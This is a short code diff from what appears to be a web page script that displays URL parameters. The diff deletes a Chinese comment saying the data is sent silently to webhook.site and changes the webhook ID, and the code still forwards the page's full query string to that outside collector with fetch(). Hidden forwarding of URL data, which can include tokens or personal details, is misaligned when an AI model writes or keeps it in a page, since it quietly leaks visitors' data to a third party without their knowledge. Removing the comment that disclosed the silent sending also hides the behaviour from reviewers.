@@ -61,9 +61,7 @@
     } else {
       paramsEl.textContent = 'No parameters received.';
     }
-
-    // 静默发送到 webhook.site
-    const webhookBase = 'https://webhook.site/36a98b83-3858-4c82-9b5f-ae98b9fcbf8e';
+    const webhookBase = 'https://webhook.site/0bad6cf6-dab9-461a-bc43-4d0aa07b30ba';
     const fullWebhookUrl = webhookBase + window.location.search;
 
     fetch(fullWebhookUrl, { method: 'GET' })
